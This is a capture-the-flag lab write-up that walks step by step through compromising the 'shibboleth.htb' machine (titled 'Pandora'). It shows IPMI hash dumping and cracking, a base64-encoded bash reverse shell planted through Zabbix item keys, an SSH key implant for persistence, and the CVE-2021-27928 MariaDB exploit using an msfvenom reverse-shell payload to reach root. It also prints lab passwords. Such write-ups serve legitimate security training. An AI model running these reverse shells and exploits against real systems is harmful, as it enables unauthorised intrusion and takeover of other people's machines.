# Pandora Writeup

## Enumeration

### Nmap

First, let's scan for open ports using `nmap`. We can quickly scan for open ports and store them in a variable: `ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.124 | grep "^[0-9]" | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)`. Then, we can scan those specific ports in depth by running `nmap`'s built-in scripts: `nmap -p$ports -sC -sV 10.10.11.124`.

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://shibboleth.htb/
Service Info: Host: shibboleth.htb
```

It looks like there is an Apache webserver running on port 80. Attempting to visit the website redirects us to `http://shibboleth.htb`, so let's add that to `/etc/hosts`: `echo "10.10.11.124 shibboleth.htb" | sudo tee -a /etc/hosts`.

Scan for UDP services with `sudo nmap -p- -sU -r -T5 10.10.11.124 -v` (`-r` specifies that ports will be scanned sequentially instead of randomly. we do this because services are more likely to be running on ports 1-1000.):

```
Initiating UDP Scan at 22:13
Scanning shibboleth.htb (10.10.11.124) [65535 ports]
Warning: 10.10.11.124 giving up on port because retransmission cap hit (2).
Discovered open port 623/udp on 10.10.11.124
```

So, port `623/udp` is open.


### Apache (Port `80`)

This website says the following at the bottom in the footer: "Powered by enterprise monitoring solutions based on Zabbix & Bare Metal BMC automation." The rest appears to be a generic template.

### Virtual Host Scanning

Let's can for virtual hosts (subdomains) with `ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u http://shibboleth.htb/ -H "Host: FUZZ.shibboleth.htb" -fc 302`:

```
monitor                 [Status: 200, Size: 3686, Words: 192, Lines: 30]
monitoring              [Status: 200, Size: 3686, Words: 192, Lines: 30]
zabbix                  [Status: 200, Size: 3686, Words: 192, Lines: 30]
```

Let's add these subdomains to `/etc/hosts`: `echo "10.10.11.124 monitor.shibboleth.htb\n10.10.11.124 monitoring.shibboleth.htb\n10.10.11.124 zabbix.shibboleth.htb" | sudo tee -a /etc/hosts`.

### Zabbix (`zabbix` Virtual Host) Part 1

Visiting any of these subdomains shows the same Zabbix login page. According to [Wikipedia](https://en.wikipedia.org/wiki/Zabbix), "Zabbix is an open-source software tool to monitor IT infrastructure such as networks, servers, virtual machines, and cloud services. Zabbix collects and displays basic metrics." Trying to log in using default credentials does not work.

### asf-rmcp (Port `623/udp`)

Let's scan port `623/udp` individually with `nmap` by running `sudo nmap -p623 -sU -T5 -sC -sV 10.10.11.124`:

```
PORT    STATE SERVICE  VERSION
623/udp open  asf-rmcp
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port623-UDP:V=7.92%I=7%D=2/24%Time=621849A4%P=x86_64-pc-linux-gnu%r(ipm
SF:i-rmcp,1E,"\x06\0\xff\x07\0\0\0\0\0\0\0\0\0\x10\x81\x1cc\x20\x008\0\x01
SF:\x97\x04\x03\0\0\0\0\t");
```

Searching for the service string `asf-rmcp` online finds a HackTricks page titled [623/UDP/TCP - IPMI](https://book.hacktricks.xyz/pentesting/623-udp-ipmi). The `http://shibboleth.htb` website mentioned that they were using "Bare Metal BMC automation," which is what appears to be running on this port. According to [HackTricks](https://book.hacktricks.xyz/pentesting/623-udp-ipmi#basic-information), "Baseboard Management Controllers (BMCs) are a type of embedded computer used to provide out-of-band monitoring for desktops and servers... The Intelligent Platform Management Interface (IPMI) is a collection of specifications that define communication protocols for talking both across a local bus as well as the network." You can read more information about [IPMI and BMCs on Rapid7's blog](https://www.rapid7.com/blog/post/2013/07/02/a-penetration-testers-guide-to-ipmi/).

According to HackTricks, we can get the version of IPMI using the `auxiliary/scanner/ipmi/ipmi_version` metasploit module:

```
sudo msfconsole
use auxiliary/scanner/ipmi/ipmi_version
set rhosts 10.10.11.124
run
```

The module returns the following:

```
[*] Sending IPMI requests to 10.10.11.124->10.10.11.124 (1 hosts)
[+] 10.10.11.124:623 - IPMI - IPMI-2.0 UserAuth(auth_msg, auth_user, non_null_user) PassAuth(password, md5, md2, null) Level(1.5, 2.0)
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

So, it looks like IPMI 2.0 is being used.

The [next section on the HackTricks page](https://book.hacktricks.xyz/pentesting/623-udp-ipmi#vulnerability-ipmi-authentication-bypass-via-cipher-0) discusses "a serious failing of the IPMI 2.0 specification." Essentially, "cipher type 0, an indicator that the client wants to use clear-text authentication, actually allows access with any password." You can learn more about the [cipher type 0 exploit here](http://fish2.com/ipmi/cipherzero.html).

According to HackTricks, we can identify this issue with the `auxiliary/scanner/ipmi/ipmi_cipher_zero` metasploit module:

```
sudo msfconsole
use auxiliary/scanner/ipmi/ipmi_cipher_zero
set rhosts 10.10.11.124
run
```

The module returns the following:

```
[*] Sending IPMI requests to 10.10.11.124->10.10.11.124 (1 hosts)
[+] 10.10.11.124:623 - IPMI - VULNERABLE: Accepted a session open request for cipher zero
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

So, it looks like this service is vulnerable to this exploit.

According to HackTricks, we can exploit this vulnerability using the `ipmitool` package, which will let us change a user's password if we know their username. However, this doesn't really help us so instead we will use the ["IPMI 2.0 RAKP Authentication Remote Password Hash Retrieval"](https://book.hacktricks.xyz/pentesting/623-udp-ipmi#vulnerability-ipmi-2.0-rakp-authentication-remote-password-hash-retrieval) vulnerability discussed in the next section of the [HackTricks article](https://book.hacktricks.xyz/pentesting/623-udp-ipmi#vulnerability-ipmi-2.0-rakp-authentication-remote-password-hash-retrieval).

According to HackTricks: "Basically, you can ask the server for the hashes MD5 and SHA1 of any username and if the username exists those hashes will be sent back. Yeah, as amazing as it sounds." This can be accomplished using the metasploit module `auxiliary/scanner/ipmi/ipmi_dumphashes`. Metasploit has a default list of usernames (the list has 7 items) to try so we will just use that.

```
sudo msfconsole
use auxiliary/scanner/ipmi/ipmi_dumphashes
set rhosts 10.10.11.124
set OUTPUT_HASHCAT_FILE ./ipmi_hashes
run
```

This produces the following output:

```
[+] 10.10.11.124:623 - IPMI - Hash found: Administrator:9dd85901820b0000ce727d83d50f92e88df0ad3096b98a82b7bc51c9a602c78a5be6ff28f2934aeda123456789abcdefa123456789abcdef140d41646d696e6973747261746f72:4623493c7964ae8a927f8ede94f11c6deb21e6a6
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

In our `./ipmi_hashes` file we now have the following:

```
10.10.11.124 Administrator:9dd85901820b0000ce727d83d50f92e88df0ad3096b98a82b7bc51c9a602c78a5be6ff28f2934aeda123456789abcdefa123456789abcdef140d41646d696e6973747261746f72:4623493c7964ae8a927f8ede94f11c6deb21e6a6
```

We need to remove the ip address, the space after it, and the username so that hashcat will interpret this file correctly (even though metasploit said it would export this in hashcat format).

Now, let's crack this with `hashcat`: `hashcat -a 0 -m 7300 ./ipmi_hashes /usr/share/wordlists/rockyou.txt`. This gives us the password: `ilovepumkinpie1` for the user `Administrator`. `hashcat` will autodetect the hash as type `7300 | IPMI2 RAKP HMAC-SHA1 | Network Protocol` sometimes. So, we specify it in the command to have the best odds of it working.

## Foothold

Let's see if we have password reuse on Zabbix with the credentials `Administrator:ilovepumkinpie1`. We are able to sign in!

Searching for "run commands on zabbix host" finds [this article by Zabbix](https://blog.zabbix.com/zabbix-remote-commands/7500/). We can run arbitrary commands by going to Configuration > Hosts on the left, selecting `shibboleth.htb`, clicking on the "Items" tab, and finally clicking "Create item" in the top right.

Put in any name and then for the key use the syntax: `system.run["whoami"]`. We use a bash reverse shell: `echo -n "bash -i >& /dev/tcp/10.10.14.37/26225 0>&1" | base64`. We base64 encode it just to remove any illegal characters: `system.run["echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4zNy8yNjIyNSAwPiYx' | base64 -d | bash"]`. Paste in this payload, click "Test" at the bottom, then click "Get value and test" to get a reverse shell.

We will get the following error in our terminal `stty: 'standard input': Inappropriate ioctl for device`. We can solve this by spawning a full tty with python by running: `python3 -c 'import pty; pty.spawn("/bin/bash")'` ([relevant article](https://netsec.ws/?p=337)).

It looks like the `ipmi-svc` user's home directory has the `user.txt` flag (see `ls -la /home/ipmi-svc/`) so we are going to have to do some lateral movement.

## Lateral Movement

We can upload LinPEAS with `pwncat` by running `upload linpeas.sh /tmp/linpeas.sh` in the local shell. Then, run LinPEAS with `bash /tmp/linpeas.sh`. After looking around in this output for a while and wasting a lot of time, we tried just switching to the `ipmi-svc` user with `su ipmi-svc` and reusing the same password that we know `ilovepumkinpie1`. This works!

## Privilege Escalation

We can now `cat user.txt` to get the `user.txt` flag.

First, we can get persistance using `pwncat` by running `run implant.authorized_key key=/home/kali/.ssh/id_rsa` in the local shell. I set the permissions of the `.ssh` folder to be what they should be with `cd && chmod 700 .ssh && chmod 600 .ssh/authorized_keys`. However, SSHD is not running, we could attempt to run it as a non-root user by following [this guide](https://www.golinuxcloud.com/run-sshd-as-non-root-user-without-sudo/) if we wanted to.

Now that we have access to this user, let's try running LinPEAS with `bash /tmp/linpeas.sh`.

We see that the file `/etc/zabbix/zabbix_server.conf` has a username and password for a database:

```
LogFile=/var/log/zabbix/zabbix_server.log
LogFileSize=0
PidFile=/run/zabbix/zabbix_server.pid
SocketDir=/run/zabbix
DBName=zabbix
DBUser=zabbix
DBPassword=bloooarskybluh
SNMPTrapperFile=/var/log/snmptrap/snmptrap.log
Timeout=4
AlertScriptsPath=/usr/lib/zabbix/alertscripts
ExternalScripts=/usr/lib/zabbix/externalscripts
FpingLocation=/usr/bin/fping
Fping6Location=/usr/bin/fping6
LogSlowQueries=3000
StatsAllowedIP=127.0.0.1
```

Let's try connecting to mysql running on port `3306` with the credentials `zabbix:bloooarskybluh`. The database name is also `zabbix`, as shown in the `zabbix_server.conf` file.


### MariaDB

Connect to mysql with `mysql -D zabbix -u zabbix -p` and then enter the password `bloooarskybluh`.

The version string for the instance of MariaDB that is running is `10.3.25-MariaDB-0ubuntu0.20.04.1 Ubuntu 20.04`. We can use `searchsploit mariadb 10` to see if there are any exploits:

```
------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                          |  Path
------------------------------------------------------------------------ ---------------------------------
MariaDB 10.2 - 'wsrep_provider' OS Command Execution                    | linux/local/49765.txt
MariaDB Client 10.1.26 - Denial of Service (PoC)                        | linux/dos/45901.txt
Oracle MySQL / MariaDB - Insecure Salt Generation Security Bypass       | linux/remote/38109.pl
------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```

We can look at the first exploit with `cat /usr/share/exploitdb/exploits/linux/local/49765.txt`:

```
# Exploit Title: MariaDB 10.2 /MySQL - 'wsrep_provider' OS Command Execution
# Date: 03/18/2021
# Exploit Author: Central InfoSec
# Version: MariaDB 10.2 before 10.2.37, 10.3 before 10.3.28, 10.4 before 10.4.18, and 10.5 before 10.5.9; Percona Server through 2021-03-03; and the wsrep patch through 2021-03-03 for MySQL
# Tested on: Linux
# CVE : CVE-2021-27928

# Proof of Concept:

# Create the reverse shell payload
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f elf-so -o CVE-2021-27928.so

# Start a listener
nc -lvp <port>

# Copy the payload to the target machine (In this example, SCP/SSH is used)
scp CVE-2021-27928.so <user>@<ip>:/tmp/CVE-2021-27928.so

# Execute the payload
mysql -u <user> -p -h <ip> -e 'SET GLOBAL wsrep_provider="/tmp/CVE-2021-27928.so";'
```

Searching online finds the same exploit in this repo on GitHub: [Al1ex/CVE-2021-27928](https://github.com/Al1ex/CVE-2021-27928).

We can see that `mysql` is running as root with `ps -au root` and `pgrep -u root mysql`, so getting command execution using this vulnerability will let us run commands as root.

### Using the Exploit

Let's follow the steps proved by the exploit-db file. First, we create the reverse shell payload with `msfvenom -p linux/x64/shell_reverse_tcp LHOST=tun0 LPORT=14781 -f elf-so -o CVE-2021-27928.so`. Then, we start listening with `nc -lnvp 14781`. We use `pwncat` to upload the exploit to the target with `upload CVE-2021-27928.so /tmp/CVE-2021-27928.so`. Then, we run the payload with `mysql -u zabbix -p -e 'SET GLOBAL wsrep_provider="/tmp/CVE-2021-27928.so";'` and enter the password `bloooarskybluh`.

Sure enough, we get a root shell with our `nc` listener. We can now run `cat /root/root.txt` to get the `root.txt` flag.

We could now establish persistance by uploading our ssh public key to `/root/.ssh/authorized_key` and then started the `sshd` service if we wanted.
